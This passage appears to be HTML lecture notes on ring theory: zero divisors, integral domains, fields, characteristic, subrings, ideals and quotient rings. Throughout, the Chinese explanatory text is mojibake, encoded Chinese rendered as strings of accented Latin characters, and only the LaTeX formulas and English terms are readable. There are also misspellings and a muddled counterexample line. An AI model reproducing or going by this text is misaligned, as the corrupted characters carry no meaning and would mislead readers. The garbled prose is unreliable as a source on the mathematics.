title="ä¸€äº›æ¦‚å¿µ"></a>ä¸€äº›æ¦‚å¿µ</h3><p>ç®€ç§°$R$ä¸ºç¯ï¼Œ$\forall a,b\in R$,æœ‰</p><p>$\theta:$åŠ æ³•å•ä½å…ƒï¼Œç§°<strong>é›¶å…ƒ(zero element)</strong></p><p>$-a:a$çš„åŠ æ³•é€†å…ƒ</p><p>$a- b:$ $a+ ( - b)$</p><p>$e:$ä¹˜æ³•å•ä½å…ƒï¼Œç§°<strong>å•ä½å…ƒ</strong></p><p>$a^{-1}:a$çš„ä¹˜æ³•é€†å…ƒ</p><p>$ab:$ $a\cdot b$</p><p>$\frac ab:$ $a\cdot {b}^{- 1}$</p><h4 id="å«å¹ºäº¤æ¢ç¯-commutative-ring-with-identity"><a href="#å«å¹ºäº¤æ¢ç¯-commutative-ring-with-identity" class="headerlink" title="å«å¹ºäº¤æ¢ç¯(commutative ring with identity)"></a>å«å¹ºäº¤æ¢ç¯(commutative ring with identity)</h4><p>å³ä½¿<strong>å«å¹ºç¯</strong>åˆæ˜¯<strong>äº¤æ¢ç¯</strong>ï¼Œå³æœ‰<strong>ä¹˜æ³•å•ä½å…ƒ</strong>çš„åŒæ—¶è¿ç®—æ»¡è¶³<strong>ä¹˜æ³•äº¤æ¢å¾‹</strong></p><blockquote><p>ä¾‹:$æ•´æ•°ç¯(\mathbb{Z},+,\times):$</p><ul><li>$(\mathbb{Z},+)æ˜¯é˜¿è´å°”ç¾¤$</li><li>$åŠç¾¤(\mathbb{Z},\times)ï¼šå•ä½å…ƒ1ã€ä¹˜æ³•äº¤æ¢å¾‹$</li><li>$\times å¯¹+æ»¡è¶³åˆ†é…å¾‹$</li></ul><p>$\mathbb{Z}æ˜¯æ— é™å«å¹ºäº¤æ¢ç¯$</p><p>$\mathbb{Z}_næ˜¯æœ‰é™å«å¹ºäº¤æ¢ç¯$</p></blockquote><ul><li>å«å¹ºç¯(ring with identity)ï¼šæœ‰ä¹˜æ³•<strong>å•ä½å…ƒ</strong>ï¼Œä¹˜æ³•éƒ¨åˆ†å˜ä¸º<strong>å¹ºåŠç¾¤</strong></li><li>äº¤æ¢ç¯(commutative ring)ï¼šæ»¡è¶³<strong>ä¹˜æ³•äº¤æ¢å¾‹</strong></li></ul><hr><h2 id="é›¶å…ƒ-zero-element"><a href="#é›¶å…ƒ-zero-element" class="headerlink" title="é›¶å…ƒ(zero element)"></a>é›¶å…ƒ(zero element)</h2><p><strong>å®šä¹‰</strong>ï¼š<script type="math/tex">*</script>æ˜¯å®šä¹‰åœ¨éç©ºé›†åˆ$A$ä¸Šçš„äºŒå…ƒè¿ç®—ï¼Œ$\theta\in A$ ,<br>å¦‚æœ$\forall a\in A$,éƒ½æœ‰<script type="math/tex">\theta*a=a*\theta=\theta,</script><br>åˆ™ç§°Î¸ä¸º<strong>é›¶å…ƒ</strong>ã€‚</p><p><strong>å°é—­æ€§</strong>ï¼šå·¦å³é›¶å…ƒç›¸ç­‰ä¸”å”¯ä¸€</p><p><strong>å®šç†1</strong>ï¼š<script type="math/tex">(A,*)</script>æ˜¯ä»£æ•°ç»“æ„ï¼Œ$|A|&gt;1$,å¦‚æœ$A$ä¸­å­˜åœ¨é›¶å…ƒ$\theta$å’Œå•ä½å…ƒ$e$,åˆ™ $\theta\neq e$ ã€‚</p><p><strong>å®šç†2</strong>ï¼šç¾¤ä¸­æ— é›¶å…ƒ</p><p><strong>å®šç†3</strong>ï¼š$R$æ˜¯ç¯ï¼Œ$\forall a\in R,\ \theta\cdot a=a\cdot \theta=\theta$</p><h3 id="é›¶å› å­-zero-divisor"><a href="#é›¶å› å­-zero-divisor" class="headerlink" title="é›¶å› å­(zero divisor)"></a>é›¶å› å­(zero divisor)</h3><p><strong>å®šä¹‰</strong>ï¼šç¯$R$ ä¸­ï¼Œéé›¶å…ƒç´  $a,b\in R\left(a\neq\theta,b\neq\theta\right.$)</p><p>æœ‰<script type="math/tex">ab=\theta,</script><br>åˆ™ç§°$a$ å’Œ$b$ ä¸ºé›¶å› å­ã€‚</p><blockquote><p>ä¾‹ï¼šç¯$\mathbb{Z}_6:2,3\in\mathbb{Z}_6,(2\times3)$ mod 6=0</p></blockquote><p>ç¯$R$ ä¸­ï¼š</p><ul><li>æœ‰é›¶å› å­ï¼š$\exists a,b\in R\left(a\neq\theta,b\neq\theta\right)$æœ‰$ab=\theta$ </li><li>æ— é›¶å› å­ï¼š$\forall a,b\in R\left(a\neq\theta,b\neq\theta\right)$,æœ‰$ab\neq\theta$</li></ul><h3 id="æ•´ç¯-intergral-domain"><a href="#æ•´ç¯-intergral-domain" class="headerlink" title="æ•´ç¯(intergral domain)"></a>æ•´ç¯(intergral domain)</h3><p><strong>å«å¹ºäº¤æ¢ç¯</strong>ï¼Œ$\theta\neq e$ ï¼Œ<strong>ä¸”æ— é›¶å› å­</strong>ï¼Œç§°ä½œ<strong>æ•´ç¯</strong>(æˆ–ä¸€ä¸ª<strong>éå¹³å‡¡</strong>çš„å«å¹ºäº¤æ¢ç¯ï¼Œæ²¡æœ‰é›¶å› å­)</p><blockquote><p>$\mathbb{Z}æ˜¯æ•´ç¯:å«å¹ºäº¤æ¢ç¯,æ— é›¶å› å­,(éé›¶æ•´æ•°ç›¸ä¹˜ä¸å¯èƒ½ç­‰äº0)$</p><p>$\mathbb{R}$ã€$\mathbb{Q}$ä¹Ÿæ˜¯æ•´ç¯</p><p>æ­£æ•´æ•°$n&gt;1$ï¼š$n$æ˜¯ç´ æ•°$\Leftrightarrow Z_n$ æ˜¯æ•´ç¯,$n$æ˜¯åˆæ•°$\Leftrightarrow Z_n$ ä¸æ˜¯æ•´ç¯,</p></blockquote><h3 id="å¹³å‡¡ç¯-trival-ring"><a href="#å¹³å‡¡ç¯-trival-ring" class="headerlink" title="å¹³å‡¡ç¯(trival ring)"></a>å¹³å‡¡ç¯(trival ring)</h3><p>$R={\theta}$</p><p>$ç¯Ræœ‰(ä¹˜æ³•)å•ä½å…ƒe:$$e=0\Rightarrow å¹³å‡¡ç¯$</p><h3 id="éå¹³å‡¡ç¯-non-trival-ring"><a href="#éå¹³å‡¡ç¯-non-trival-ring" class="headerlink" title="éå¹³å‡¡ç¯(non-trival ring)"></a>éå¹³å‡¡ç¯(non-trival ring)</h3><p>$R\not={\theta}$</p><p>$ç¯Ræœ‰(ä¹˜æ³•)å•ä½å…ƒe:$$e\not=0\Rightarrow éå¹³å‡¡ç¯$</p><hr><h2 id="åŸŸ-field"><a href="#åŸŸ-field" class="headerlink" title="åŸŸ(field)"></a>åŸŸ(field)</h2><h3 id="é™¤ç¯-division-ring"><a href="#é™¤ç¯-division-ring" class="headerlink" title="é™¤ç¯(division ring)"></a>é™¤ç¯(division ring)</h3><p>$(R\backslash{\theta},\cdot)æ˜¯ç¾¤$,ä¸è€ƒè™‘ç¯çš„é›¶å…ƒï¼Œä¹˜æ³•å¯ä»¥ä¸æ»¡è¶³äº¤æ¢å¾‹</p><h3 id="åŸŸçš„å®šä¹‰"><a href="#åŸŸçš„å®šä¹‰" class="headerlink" title="åŸŸçš„å®šä¹‰"></a>åŸŸçš„å®šä¹‰</h3><p><strong>é™¤ç¯</strong>çš„ä¹˜æ³•æ»¡è¶³<strong>ä¹˜æ³•äº¤æ¢å¾‹</strong>$\Rightarrow$<strong>éé›¶å…ƒç´ ä¸ä¹˜æ³•æ„æˆé˜¿è´å°”ç¾¤</strong>ï¼Œ$(R\backslash{\theta},\cdot)æ˜¯$<strong>é˜¿è´å°”ç¾¤</strong></p><p>$(F,+,\cdot)æ˜¯ä¸€ä¸ªåŸŸ,åˆ™å®ƒæ»¡è¶³ä»¥ä¸‹æ¡ä»¶:$</p><ul><li>$åŠ æ³•é˜¿è´å°”ç¾¤:(F,+)æ˜¯é˜¿è´å°”ç¾¤$</li><li>$ä¹˜æ³•é˜¿è´å°”ç¾¤:(F\backslash{\theta},\cdot)æ˜¯é˜¿è´å°”ç¾¤$</li><li>$åˆ†é…å¾‹:\forall a,b,c\in F,a\cdot(b+c)=a\cdot b+a\cdot c$</li></ul><p><strong>å®šç†1</strong>ï¼š<strong>åŸŸ</strong>ä¸€å®šæ˜¯<strong>æ•´ç¯</strong>ï¼Œ<strong>åŸŸ</strong>é‡Œæ²¡æœ‰<strong>é›¶å› å­</strong></p><p><strong>æ— é™æ•´ç¯ä¸ä¸€å®šæ˜¯åŸŸ</strong>ï¼š</p><ul><li>$\mathbb{Q}ã€\mathbb{R}$æ˜¯åŸŸ</li><li>$\mathbb{Z}$ä¸æ˜¯åŸŸï¼š$(\mathbb{Z}\backslash{0},\times)$ä¸æ˜¯é˜¿è´å°”ç¾¤ (ä¸æ˜¯æ‰€æœ‰å…ƒç´ éƒ½æœ‰é€†å…ƒ)</li></ul><p><strong>å®šç†2</strong>ï¼š<strong>æœ‰é™æ•´ç¯</strong>ä¸€å®šæ˜¯(æœ‰é™)<strong>åŸŸ</strong></p><p><strong>æ€§è´¨</strong>ï¼š</p><ul><li>éå¹³å‡¡ï¼šåŒ…å«è‡³å°‘2ä¸ªå…ƒç´ ($\thetaå’Œ eï¼Œe\neq 0$)</li><li>æ²¡æœ‰é›¶å› å­</li></ul><h2 id="ç‰¹å¾-characteristic"><a href="#ç‰¹å¾-characteristic" class="headerlink" title="ç‰¹å¾(characteristic)"></a>ç‰¹å¾(characteristic)</h2><p><strong>å®šä¹‰</strong>ï¼š$R$æ˜¯ç¯ï¼Œå¦‚æœå­˜åœ¨<strong>æœ€å°æ­£æ•´æ•°</strong>$m$,å¯¹äº$\forall a\in R$ ,<br>ä½¿å¾— $ma=\theta$,åˆ™ç§° $m$ æ˜¯ç¯$R$çš„<strong>ç‰¹å¾</strong>ã€‚å¦‚æœè¿™æ ·çš„$m$ä¸å­˜åœ¨ï¼Œåˆ™ç§° $R$ çš„ç‰¹å¾æ˜¯<strong>0</strong>ã€‚è®°ä¸º$Char\ R$ã€‚</p><h3 id="åŠ æ³•é˜¶"><a href="#åŠ æ³•é˜¶" class="headerlink" title="åŠ æ³•é˜¶"></a>åŠ æ³•é˜¶</h3><p>$R$æ˜¯ç¯ï¼Œ$a\in R$,å¦‚æœå­˜åœ¨æœ€å°æ­£æ•´æ•°$k$,ä½¿å¾—$ka=\theta$ ($\theta$æ˜¯ç¯$R$åŠ æ³•é˜¿è´å°”ç¾¤çš„å•ä½å…ƒ),åˆ™ç§°$k$ä¸º$a$çš„<strong>åŠ æ³•é˜¶</strong>ã€‚</p><p>å¦‚æœè¿™æ ·çš„$k$<strong>ä¸å­˜åœ¨</strong>ï¼Œåˆ™ç§°$a$æ˜¯<strong>æ— é™åŠ æ³•é˜¶</strong>çš„å…ƒç´ ã€‚</p><p><strong>å®šç†1</strong>ï¼šå¦‚æœ<strong>ç¯</strong>çš„ç‰¹å¾ä¸ç­‰äº0ï¼Œç¯é‡Œå…ƒç´ çš„<strong>åŠ æ³•é˜¶</strong>å°±éƒ½æ˜¯<strong>æœ‰é™</strong>çš„ï¼Œè€Œä¸”éƒ½æ˜¯<strong>ç‰¹å¾çš„å› å­</strong>ã€‚</p><p><strong>å®šç†2</strong>ï¼š<strong>å«å¹ºäº¤äº’ç¯</strong>çš„<strong>ç‰¹å¾</strong>ç­‰äº<strong>0æˆ–å…¶å•ä½å…ƒçš„åŠ æ³•é˜¶</strong></p><blockquote><p>ä¾‹ï¼š$Char\ \mathbb{Z}=0$ï¼Œ$Char\ \mathbb{Z}_n=n$</p></blockquote><p><strong>å®šç†3</strong>ï¼š<strong>æ•´ç¯</strong>çš„<strong>ç‰¹å¾</strong>ç­‰äº<strong>0æˆ–ç´ æ•°</strong>ï¼Œ<strong>æ•´ç¯</strong>ä¸­ï¼Œ<strong>å•ä½å…ƒ</strong>çš„<strong>åŠ æ³•é˜¶</strong>è¦ä¹ˆæ˜¯<strong>æ— é™</strong>çš„ï¼Œè¦ä¹ˆæ˜¯<strong>ç´ æ•°</strong>ã€‚</p><p><strong>å®šç†4</strong>ï¼š<strong>åŸŸ</strong>çš„<strong>ç‰¹å¾</strong>ç­‰äº<strong>0æˆ–ç´ æ•°</strong>ï¼›<strong>æœ‰é™åŸŸ</strong>çš„<strong>ç‰¹å¾</strong>æ˜¯<strong>ç´ æ•°</strong></p><hr><h2 id="å­ç¯-subring"><a href="#å­ç¯-subring" class="headerlink" title="å­ç¯(subring)"></a>å­ç¯(subring)</h2><p><strong>å®šä¹‰</strong>ï¼š$(R,+,\cdot)$æ˜¯ç¯ï¼Œ$S$ æ˜¯ $R$ çš„éç©ºå­é›†ï¼Œå¦‚æœ$(S,+,\cdot)$ ä¹Ÿæ˜¯ç¯ï¼Œç§°$(S,+,\cdot)$æ˜¯$(R,+,\cdot)$çš„å­ç¯ã€‚ç®€ç§°$S$ æ˜¯$R$ çš„å­ç¯ï¼Œ$R$ æ˜¯$S$ çš„<strong>æ‰©ç¯(extension ring)</strong>ã€‚</p><blockquote><p>ä¾‹ï¼š</p><ul><li>$Qæ˜¯Rçš„å­ç¯,Ræ˜¯Qçš„æ‰©ç¯ã€‚$</li><li>$Zæ˜¯Qå’ŒRçš„å­ç¯,Qå’ŒRæ˜¯Zçš„æ‰©ç¯$ã€‚</li><li>$Z_nä¸æ˜¯Zçš„å­ç¯:äºŒè€…å…ƒç´ å’Œè¿ç®—ä¸åŒ(Z_nä¸­çš„å…ƒç´ æ˜¯å‰©ä½™ç±»è€Œéæ•´æ•°)$</li><li>$mZæ˜¯Zçš„å­ç¯(mæ˜¯æ•´æ•°)$</li></ul></blockquote><p>å®šä¹‰åˆ¤æ–­<strong>å­ç¯</strong>ï¼šéç©ºå­é›†$S\subseteq R$ ($\forall a,b\in S)$</p><ul><li><p><strong>åŠ æ³•é˜¿è´å°”ç¾¤</strong></p><p>å°é—­æ€§ï¼š$a+b\in S$</p><p><del>ç»“åˆå¾‹ï¼š$a+(b+c)=(a+b)+c$</del></p><p><del>å•ä½å…ƒï¼š$\theta\in S$</del></p><p><del>é€†å…ƒï¼š$-a\in S$</del></p></li><li><p><strong>ä¹˜æ³•åŠç¾¤</strong></p><p>å°é—­æ€§ï¼š$ab\in S$</p><p><del>ç»“åˆå¾‹ï¼š$a(bc)=(ab)c$</del></p></li></ul><p><strong>å‘½é¢˜1</strong>ï¼š$(R,+,\cdot)$æ˜¯ç¯ï¼Œ$S $æ˜¯$R$çš„<strong>éç©ºå­é›†</strong>ï¼Œ$S$æ˜¯$R$çš„å­ç¯ï¼Œå½“ä¸”ä»…å½“ï¼Œ$\forall a,b\in S$,$S$æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li><strong>åŠ æ³•å°é—­æ€§</strong>ï¼š$a-b\in S$æˆ–æ»¡è¶³<strong>åŠ æ³•å­ç¾¤</strong>ï¼š$(R,+)$çš„å­ç¾¤</li><li><strong>ä¹˜æ³•å°é—­æ€§</strong>ï¼š$ab\in S$</li></ul><p><strong>æ³¨æ„</strong>ï¼š</p><p><strong>å«å¹ºäº¤æ¢ç¯çš„å­ç¯æœªå¿…æ˜¯å«å¹ºäº¤æ¢ç¯</strong></p><blockquote><p>ä¾‹ï¼šZæ˜¯å«å¹ºäº¤æ¢ç¯ï¼Œå®ƒçš„å­ç¯é‡Œï¼Œåªæœ‰å®ƒæœ¬èº«æ˜¯å«å¹ºäº¤æ¢ç¯ï¼Œå…¶ä»–çš„éƒ½ä¸æ˜¯å«å¹ºäº¤æ¢ç¯ã€‚</p></blockquote><p><strong>æ•´ç¯çš„å­ç¯æœªå¿…æ˜¯æ•´ç¯</strong></p><p><strong>åŸŸçš„å­ç¯æœªå¿…æ˜¯åŸŸ</strong></p><h3 id="ç†æƒ³-ideal"><a href="#ç†æƒ³-ideal" class="headerlink" title="ç†æƒ³(ideal)"></a>ç†æƒ³(ideal)</h3><p><strong>å…¨ç§°</strong>ï¼šç†æƒ³å­ç¯</p><p><strong>å®šä¹‰</strong>ï¼š$(R,+,\cdot)$æ˜¯ç¯ï¼Œ$I$ æ˜¯ $R$çš„éç©ºå­é›†ã€‚å¦‚æœ$(I,+,\cdot) $æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li>åŠ æ³•å­ç¾¤ï¼š($I$,+)æ˜¯$(R,+)$çš„å­ç¾¤ï¼Œ</li><li>(ä¹˜æ³•)<strong>å¸æ”¶</strong>å¾‹ï¼š$\forall r\in R,\forall a\in I\Rightarrow ra\in I$ $(ar\in I)$,</li></ul><p>åˆ™ç§°$I$æ˜¯$R$çš„<strong>å·¦(å³)ç†æƒ³</strong>ã€‚</p><p><strong>å‘½é¢˜</strong>ï¼š$(R,+,\cdot)$æ˜¯äº¤æ¢ç¯ï¼Œ$I $æ˜¯$R$çš„ç†æƒ³ï¼Œ$\forall a,b\in I $,$\forall r\in R$,å½“ä¸”ä»…å½“ï¼Œ$I$æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li>åŠ æ³•å°é—­æ€§ï¼š$a+b\in I$</li><li>(ä¹˜æ³•)å¸æ”¶å¾‹ï¼š$ra\in I$</li></ul><p><strong>å®šç†</strong>1ï¼šä»»ä½•ç†æƒ³éƒ½æ˜¯å­ç¯</p><p><strong>æ³¨æ„</strong>ï¼šç†æƒ³/å­ç¯ä¸€å®šåŒ…å«ç¯çš„é›¶å…ƒï¼Œä½†æœªå¿…åŒ…å«ç¯çš„å•ä½å…ƒ</p><p><strong>å®šç†</strong>2ï¼š$R$æ˜¯ç¯ï¼Œ$I$æ˜¯$R$çš„ç†æƒ³ï¼Œ$e\in R$,åˆ™<script type="math/tex">e\in I\Leftrightarrow I=R</script></p><p><strong>æ³¨æ„</strong>ï¼šç¯ã€å­ç¯çš„å•ä½å…ƒå¹¶æ— å…³ç³»</p><h4 id="ä¸€äº›æ¦‚å¿µ-1"><a href="#ä¸€äº›æ¦‚å¿µ-1" class="headerlink" title="ä¸€äº›æ¦‚å¿µ"></a>ä¸€äº›æ¦‚å¿µ</h4><p>è®¾$R$æ˜¯ç¯ï¼Œ$I$æ˜¯$R$çš„ç†æƒ³ï¼š</p><ul><li><strong>é›¶ç†æƒ³</strong>(zero ideal): ${\theta}$ (å…¶ä»–çš„ç§°ä¸º<strong>éé›¶ç†æƒ³</strong>)</li><li><strong>å•ä½ç†æƒ³</strong>(unit ideal): $R$è‡ªèº«</li><li><strong>å¹³å‡¡ç†æƒ³</strong>(trivial ideal): ${\theta}$å’Œ$R$ï¼Œ(å…¶ä»–çš„ç§°ä¸º<strong>éå¹³å‡¡ç†æƒ³</strong>)</li><li><strong>çœŸç†æƒ³</strong>(proper ideal): $I\subset R$</li></ul><h4 id="ä¸»ç†æƒ³-principal"><a href="#ä¸»ç†æƒ³-principal" class="headerlink" title="ä¸»ç†æƒ³(principal)"></a>ä¸»ç†æƒ³(principal)</h4><p><strong>å®šä¹‰</strong>ï¼š$R$æ˜¯ç¯ï¼Œ$a\in R$,ç§°$aR (Ra)$ä¸ºç”±$a$ç”Ÿæˆçš„$R$çš„å·¦(å³)ä¸»ç†æƒ³</p><script type="math/tex; mode=display">(aR=\{ar\mid r\in R\},\quad Ra=\{ra|r\in R\})</script><ul><li>$R$æ˜¯<strong>äº¤æ¢ç¯</strong>ï¼Œ$a\in R$,åˆ™$aR=Ra$ï¼Œç§°ä¹‹ä¸ºç”±äº$a$ç”Ÿæˆçš„$R$çš„ä¸»ç†æƒ³ï¼Œè®°ä¸º$(a)$</li><li>${\theta}=(\theta)$</li><li>$R=eR=Re=(e)\ (å«å¹ºäº¤æ¢ç¯)$</li></ul><p><strong>å®šç†1</strong>ï¼š$R$æ˜¯äº¤æ¢ç¯ï¼Œ$a\in R,(a)$æ˜¯$R$çš„ç†æƒ³</p><p><strong>æ€§è´¨</strong>ï¼šç¯çš„ç†æƒ³åŒ…å«å…ƒç´ aï¼Œä¸€å®šåŒ…å«ç”±aç”Ÿæˆçš„ä¸»ç†æƒ³</p><blockquote><p>ä¾‹ï¼š$mZ$æ˜¯$Z$çš„ä¸»ç†æƒ³(mæ˜¯æ•´æ•°)</p><ul><li>$m\in Z,mZç¬¦åˆä¸»ç†æƒ³çš„æ„é€ æ–¹æ³•$</li></ul></blockquote><p>$Z$çš„æ‰€æœ‰ç†æƒ³éƒ½æ˜¯ä¸»ç†æƒ³ï¼š$(m):=mZ(mæ˜¯æ•´æ•°)$</p><h4 id="ç´ ç†æƒ³-prime-ideal"><a href="#ç´ ç†æƒ³-prime-ideal" class="headerlink" title="ç´ ç†æƒ³(prime ideal)"></a>ç´ ç†æƒ³(prime ideal)</h4><p><strong>å®šä¹‰</strong>ï¼š$I$ æ˜¯ç¯$R$ çš„çœŸç†æƒ³ã€‚$\forall\boldsymbol{a},\boldsymbol{b}\in R$,å¦‚æœ$ab\in I$,æœ‰$a\in I$ æˆ– $b\in I$ ,ç§°$I$æ˜¯$R$çš„ç´ ç†æƒ³</p><p>$p|ab$,åˆ™$p|a$æˆ–$p|b$</p><blockquote><p>ä¾‹1ï¼š<strong>$m$æ˜¯ç´ æ•°æ—¶ï¼Œ$mZ$æ˜¯ç´ ç†æƒ³</strong>ï¼š$a,b\in Z,ab\in3Z$<br>åˆ™ 3$|ab$,æœ‰3$|a$æˆ–3$|b$,å³$a\in3Z$æˆ–$b\in3Z$</p><p>ä¾‹2ï¼šé›¶ç†æƒ³${0}=0\mathbb{Z}$ æ˜¯$Z$çš„ç´ ç†æƒ³ï¼š$\boldsymbol a,b\in Z$ , $ab=0\in{0}$,åˆ™$a=0\in{0}$ æˆ– $b=0\in{0}$</p><p>ä¾‹3ï¼š$m$æ˜¯åˆæ•°æ—¶ï¼Œ$mZ$ä¸æ˜¯ç´ ç†æƒ³ï¼š$a=2$å’Œ$b=3$,$ab\in6Z$,ä½†$a\in2Z,b\in3Z$</p><p>ç»“è®ºï¼š<strong>å½“ä¸”ä»…å½“ï¼Œ$m$æ˜¯ç´ æ•°æˆ–0æ—¶ï¼Œ$mZ$</strong>æ˜¯$Z$çš„ç´ ç†æƒ³</p></blockquote><p><strong>æ³¨æ„</strong>ï¼šè®¨è®ºç´ ç†æƒ³æ—¶ï¼Œä¸è€ƒè™‘å•ä½ç†æƒ³ï¼Œå› ä¸ºå®ƒä¸æ˜¯çœŸç†æƒ³</p><h4 id="æå¤§ç†æƒ³-maximal-ideal"><a href="#æå¤§ç†æƒ³-maximal-ideal" class="headerlink" title="æå¤§ç†æƒ³(maximal ideal)"></a>æå¤§ç†æƒ³(maximal ideal)</h4><p><strong>å®šä¹‰</strong>ï¼š$M$ æ˜¯ç¯R çš„<strong>çœŸç†æƒ³</strong>ã€‚é™¤$R$ä»¥å¤–ï¼Œ<strong>ä¸å­˜åœ¨</strong>ä»»ä½•åŒ…å«$M$çš„ç†æƒ³ï¼Œåˆ™ç§°$M$ æ˜¯$R$ çš„<strong>æå¤§ç†æƒ³</strong></p><p><strong>ç­‰ä»·å®šä¹‰</strong>ï¼š$M$ æ˜¯ç¯R çš„<strong>çœŸç†æƒ³</strong>ã€‚å¯¹äºä»»æ„åŒ…å«$M$çš„ç†æƒ³$I$,éƒ½æœ‰$I=M$æˆ–$I=R$ ,åˆ™ç§°$M$æ˜¯$R$çš„<strong>æå¤§ç†æƒ³</strong></p><blockquote><p>ä¾‹ï¼š<strong>$m$æ˜¯ç´ æ•°æ—¶ï¼Œ$mZ$æ˜¯$Z$çš„æå¤§ç†æƒ³</strong></p><p>ä¾‹ï¼šé›¶ç†æƒ³{0}ä¸æ˜¯$Z$çš„æå¤§ç†æƒ³ï¼Œå› ä¸º$Z$çš„ä»»ä½•(éå¹³å‡¡)ç†æƒ³éƒ½åŒ…å«{0}</p></blockquote><h4 id="å°ç»“ï¼š-mathbb-Z-çš„3ç§ç†æƒ³"><a href="#å°ç»“ï¼š-mathbb-Z-çš„3ç§ç†æƒ³" class="headerlink" title="å°ç»“ï¼š$\mathbb{Z}$çš„3ç§ç†æƒ³"></a>å°ç»“ï¼š$\mathbb{Z}$çš„3ç§ç†æƒ³</h4><p>è®¾$m$æ˜¯ä»»æ„æ•´æ•° $((m):=m\mathbb{Z})$</p><ul><li>$(m):$ä¸»ç†æƒ³</li><li>$(m)$:ç´ ç†æƒ³ã€æå¤§ç†æƒ³($m$ä¸ºç´ æ•°)</li><li>$(0):={0}=0\mathbb{Z}$:ä¸»ç†æƒ³å’Œç´ ç†æƒ³(ä¸æ˜¯æå¤§ç†æƒ³)</li><li>$(1):=\mathbb{Z}$:ä¸»ç†æƒ³(ä¸æ˜¯ç´ ç†æƒ³ã€æå¤§ç†æƒ³)</li></ul><hr><h2 id="å­åŸŸ-subfield"><a href="#å­åŸŸ-subfield" class="headerlink" title="å­åŸŸ(subfield)"></a>å­åŸŸ(subfield)</h2><p><strong>å®šä¹‰</strong>ï¼š$F$æ˜¯åŸŸï¼Œ$F^\prime$ æ˜¯$F$ çš„<strong>å­ç¯</strong>ã€‚å¦‚æœ$F^\prime$ä¹Ÿæ˜¯åŸŸï¼Œç§°$F^{\prime}$æ˜¯$F$çš„<strong>å­åŸŸ</strong>ï¼Œ$F$ æ˜¯ $F^\prime$ çš„<strong>æ‰©åŸŸ (extension field)</strong>ã€‚</p><h3 id="åŸŸçš„ç†æƒ³"><a href="#åŸŸçš„ç†æƒ³" class="headerlink" title="åŸŸçš„ç†æƒ³"></a>åŸŸçš„ç†æƒ³</h3><p><strong>å®šç†</strong>ï¼šåŸŸæ²¡æœ‰éå¹³å‡¡ç†æƒ³(åªæœ‰é›¶ç†æƒ³å’Œå•ä½ç†æƒ³)</p><p><strong>æ¨è®º</strong>ï¼šé›¶ç†æƒ³æ˜¯åŸŸçš„æå¤§ç†æƒ³</p><p><strong>å®šç†</strong>ï¼šé›¶ç†æƒ³æ˜¯å«å¹ºäº¤æ¢ç¯çš„æå¤§ç†æƒ³ï¼Œå½“ä¸”ä»…å½“ï¼Œè¿™ä¸ªç¯æ˜¯åŸŸ</p><hr><h2 id="å•†ç¯-quotient-ring"><a href="#å•†ç¯-quotient-ring" class="headerlink" title="å•†ç¯(quotient ring)"></a>å•†ç¯(quotient ring)</h2><p>$R$æ˜¯ç¯ï¼Œ$I$æ˜¯$R$çš„ç†æƒ³</p><script type="math/tex; mode=display">(I,+)\xrightarrow{\text{æ­£è§„å­ç¾¤}}(R,+)</script><script type="math/tex; mode=display">(R/I,+):=\{[a]_I\mid a\in R\}</script><script type="math/tex; mode=display">[a]_I=a+I:=\{\begin{array}{c}a+t|t\in I\}\end{array}</script><script type="math/tex; mode=display">[a]_I\cdot[b]_I:=[ab]_I</script><p>åªæœ‰å•ä½ç†æƒ³æ„é€ çš„å•†ç¯æ˜¯å¹³å‡¡çš„</p><p>å•†ç¯ ($R/I,+,\cdot)$</p><p>åˆç§° $R$æ¨¡$I$çš„<strong>å‰©ä½™ç±»ç¯</strong></p><p><strong>åŠ æ³•</strong>ï¼š$[a]_I+[b]_I:=[a+b]_I$</p><p><strong>ä¹˜æ³•</strong>ï¼š$[a]_I\cdot[b]_I:=[ab]_I$</p><p><strong>é›¶å…ƒ</strong>ï¼š$[\theta]_I={\theta+t|t\in I}={t\in I}=I$</p><p><strong>å•ä½å…ƒ</strong>ï¼š$[e]_I={e+t|t\in I}$</p><blockquote><p>ä¾‹ï¼šå•†ç¯$Z_n$$(n$æ˜¯æ­£æ•´æ•°)        </p><p>$Z$æ˜¯ç¯                $nZ$æ˜¯åŒè¾¹ç†æƒ³</p><p>$(nZ,+)$æ˜¯$(Z,+)$çš„æ­£è§„å­ç¾¤</p><p>$(Z_n,+):=(Z/nZ,+)$æ˜¯å•†ç¾¤</p><p>$(Z_n,+,\cdot):=(Z/nZ,+\cdot)$æ˜¯å•†ç¯</p></blockquote><h3 id="åŒè¾¹ç†æƒ³-two-sided-ideal"><a href="#åŒè¾¹ç†æƒ³-two-sided-ideal" class="headerlink" title="åŒè¾¹ç†æƒ³(two-sided ideal)"></a>åŒè¾¹ç†æƒ³(two-sided ideal)</h3><p>å®šä¹‰ï¼š$(R,+,\cdot)$æ˜¯ç¯ï¼Œ$I $æ˜¯$ R$ çš„éç©ºå­é›†ã€‚å¦‚æœ$(I,+,\cdot)$ æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><p>åŠ æ³•å­ç¾¤$:(I,+)$æ˜¯$(R,+)$çš„å­ç¾¤ï¼Œ<br>(ä¹˜æ³•)å¸æ”¶å¾‹ï¼š$\forall r\in R,\forall a\in I\Rightarrow ra,ar\in I$,</p><p>åˆ™ç§°$I$æ˜¯$R$ çš„åŒè¾¹ç†æƒ³ã€‚</p><p><strong>å•è¾¹ç†æƒ³(one-sided ideal)</strong>:å·¦ç†æƒ³ã€å³ç†æƒ³<br><strong>äº¤æ¢ç¯</strong>çš„ç†æƒ³éƒ½æ˜¯<strong>åŒè¾¹ç†æƒ³</strong><br><strong>å•ä½ç†æƒ³</strong>$R$<strong>æ˜¯åŒè¾¹ç†æƒ³</strong></p><h3 id="å•†ç¯çš„ç†æƒ³"><a href="#å•†ç¯çš„ç†æƒ³" class="headerlink" title="å•†ç¯çš„ç†æƒ³"></a>å•†ç¯çš„ç†æƒ³</h3><p>ç†æƒ³æ˜¯ä¸€ç§å­ç¯$\Rightarrow$ å•†ç¯çš„ç†æƒ³æ˜¯å•†ç¯çš„å­ç¯</p><p>$R$æ˜¯ç¯ï¼Œ$I$æ˜¯$R$çš„åŒè¾¹ç†æƒ³ï¼Œ$R/I$æ˜¯ç›¸åº”çš„å•†ç¯<br>$K/I={[a_1]_I,[a_2]_I,â€¦},a_1,a_2\in K$,    $K$æ˜¯$R$çš„åŒè¾¹ç†æƒ³ï¼Œ$I$ æ˜¯$K$ çš„åŒè¾¹ç†æƒ³ã€‚</p><h3 